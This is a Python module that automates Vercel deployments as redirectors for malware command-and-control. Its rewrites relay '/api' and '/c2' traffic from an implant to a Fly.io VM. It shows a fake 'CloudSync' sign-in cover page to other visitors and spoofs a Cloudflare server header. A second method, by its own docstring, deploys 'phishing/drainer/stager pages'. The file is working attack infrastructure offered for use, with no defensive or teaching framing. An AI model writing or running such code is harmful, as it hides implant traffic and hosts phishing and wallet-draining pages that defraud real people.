# vercel_deployer.py — Deploys ephemeral redirector pages
import json
import requests
import secrets
import time
from typing import Any, Dict


class VercelDeployer:
    """
    Deploys a Vercel page that acts as a reverse proxy to the current Fly.io VM.
    Uses vercel.json rewrites to forward all traffic transparently.
    The page itself serves a static "legit-looking" landing page for any
    visitor that isn't the implant (cover traffic).
    """

    BASE = "https://api.vercel.com/v13"

    def __init__(self, api_token: str, team_slug: str, project_base: str):
        self.token = api_token
        self.team = team_slug
        self.project_base = project_base
        self.headers: Dict[str, str] = {
            "Authorization": f"Bearer {self.token}",
            "Content-Type": "application/json",
        }
        self._team_param: Dict[str, Any] = {"teamId": None}  # resolved on first call

    def _resolve_team(self) -> str:
        if self._team_param["teamId"]:
            return str(self._team_param["teamId"])
        resp = requests.get("https://api.vercel.com/v2/teams", headers=self.headers)
        resp.raise_for_status()
        for team in resp.json().get("teams", []):
            if team["slug"] == self.team:
                self._team_param["teamId"] = team["id"]
                return str(team["id"])
        raise ValueError(f"Team '{self.team}' not found")

    # ------------------------------------------------------------------
    # Redirector deployment (reverse proxy → Fly VM)
    # ------------------------------------------------------------------
    def deploy_redirector(
        self, target_host: str, target_port: int, suffix: str
    ) -> Dict[str, Any]:
        """Create a new Vercel project + deployment that proxies to the Fly VM."""
        team_id = self._resolve_team()
        project_name = f"{self.project_base}-{suffix}"

        # 1. Create project
        resp = requests.post(
            f"{self.BASE}/projects",
            headers=self.headers,
            json={
                "name": project_name,
                "teamId": team_id,
                "framework": "next",
            },
        )
        # If project name collision, append random suffix
        if resp.status_code == 409:
            project_name = f"{project_name}-{secrets.token_hex(3)}"
            resp = requests.post(
                f"{self.BASE}/projects",
                headers=self.headers,
                json={"name": project_name, "teamId": team_id, "framework": "next"},
            )
        resp.raise_for_status()
        project = resp.json()
        project_id = project["id"]

        # 2. Build the deployment payload
        target_url = f"http://{target_host}:{target_port}"

        files = [
            {"file": "index.html", "data": self._cover_page_html()},
            {"file": "vercel.json", "data": self._vercel_config(target_url)},
            {"file": "package.json", "data": '{"name":"app","version":"1.0.0","private":true}'},
        ]

        # 3. Create deployment
        resp = requests.post(
            f"{self.BASE}/deployments",
            headers=self.headers,
            params={"teamId": team_id, "projectId": project_id},
            json={
                "name": project_name,
                "files": files,
                "projectSettings": {
                    "framework": None,
                    "buildCommand": None,
                    "outputDirectory": None,
                },
                "target": "production",
            },
        )
        resp.raise_for_status()
        deployment = resp.json()

        # 4. Wait for deployment to be ready
        deployment_id = deployment["id"]
        deployment_url = deployment.get("url", f"{project_name}.vercel.app")
        self._wait_ready(deployment_id, team_id, timeout=120)

        return {
            "project_name": project_name,
            "project_id": project_id,
            "deployment_url": deployment_url,
            "deployment_id": deployment_id,
        }

    # ------------------------------------------------------------------
    # Custom deployment (arbitrary files — phishing/drainer/stager pages)
    # ------------------------------------------------------------------
    def deploy_custom(self, files: Dict[str, str], suffix: str) -> Dict[str, Any]:
        """Deploy arbitrary files to Vercel (for phishing/drainer/stager pages)."""
        team_id = self._resolve_team()
        project_name = f"{self.project_base}-{suffix}"

        # Create project
        resp = requests.post(
            f"{self.BASE}/projects",
            headers=self.headers,
            json={"name": project_name, "teamId": team_id},
        )
        if resp.status_code == 409:
            project_name = f"{project_name}-{secrets.token_hex(3)}"
            resp = requests.post(
                f"{self.BASE}/projects",
                headers=self.headers,
                json={"name": project_name, "teamId": team_id},
            )
        resp.raise_for_status()
        project_id = resp.json()["id"]

        # Build file list for deployment
        file_list: list[Dict[str, str]] = []
        for filename, content in files.items():
            file_list.append({"file": filename, "data": content})

        # Add vercel.json with spoofed headers
        file_list.append(
            {
                "file": "vercel.json",
                "data": json.dumps(
                    {
                        "version": 2,
                        "headers": [
                            {
                                "source": "/(.*)",
                                "headers": [
                                    {"key": "X-Content-Type-Options", "value": "nosniff"},
                                    {"key": "X-Frame-Options", "value": "DENY"},
                                    {"key": "Server", "value": "cloudflare"},
                                ],
                            }
                        ],
                    }
                ),
            }
        )

        # Deploy
        resp = requests.post(
            f"{self.BASE}/deployments",
            headers=self.headers,
            params={"teamId": team_id, "projectId": project_id},
            json={
                "name": project_name,
                "files": file_list,
                "target": "production",
            },
        )
        resp.raise_for_status()
        deployment = resp.json()
        deployment_id = deployment["id"]
        deployment_url = deployment.get("url", f"{project_name}.vercel.app")
        self._wait_ready(deployment_id, team_id, timeout=120)

        return {
            "project_name": project_name,
            "project_id": project_id,
            "deployment_url": deployment_url,
            "deployment_id": deployment_id,
        }

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------
    def _vercel_config(self, target: str) -> str:
        """vercel.json: rewrite /api/* to Fly VM, serve cover page for everything else."""
        return json.dumps(
            {
                "version": 2,
                "rewrites": [
                    {"source": "/api/:path*", "destination": f"{target}/:path*"},
                    {"source": "/c2/:path*", "destination": f"{target}/:path*"},
                ],
                "headers": [
                    {
                        "source": "/(.*)",
                        "headers": [
                            {"key": "X-Content-Type-Options", "value": "nosniff"},
                            {"key": "X-Frame-Options", "value": "DENY"},
                            {"key": "Server", "value": "cloudflare"},
                        ],
                    }
                ],
            },
            indent=2,
        )

    def _cover_page_html(self) -> str:
        """Legit-looking static page for anyone who visits the URL directly."""
        return """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CloudSync — File Synchronization Service</title>
<style>
body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;max-width:600px;margin:80px auto;padding:0 20px;color:#333}
h1{font-size:1.5rem;font-weight:600}
p{color:#666;line-height:1.6}
.btn{display:inline-block;padding:10px 24px;background:#0070f3;color:#fff;border-radius:6px;text-decoration:none;margin-top:20px}
</style>
</head>
<body>
<h1>CloudSync</h1>
<p>Secure file synchronization across all your devices. Sign in to continue.</p>
<a href="#" class="btn">Sign In</a>
<p style="margin-top:40px;font-size:0.8rem;color:#999">&copy; 2024 CloudSync. All rights reserved.</p>
</body>
</html>"""

    def _wait_ready(self, deployment_id: str, team_id: str, timeout: int = 120) -> None:
        deadline = time.time() + timeout
        while time.time() < deadline:
            resp = requests.get(
                f"{self.BASE}/deployments/{deployment_id}",
                headers=self.headers,
                params={"teamId": team_id},
            )
            if resp.ok:
                state = resp.json().get("readyState", "")
                if state == "READY":
                    return
            time.sleep(3)
        raise TimeoutError(f"Deployment {deployment_id} not ready in {timeout}s")

    def destroy_deployment(self, deployment_id: str) -> None:
        """Delete the deployment."""
        team_id = self._resolve_team()
        requests.delete(
            f"{self.BASE}/deployments/{deployment_id}",
            headers=self.headers,
            params={"teamId": team_id},
        )
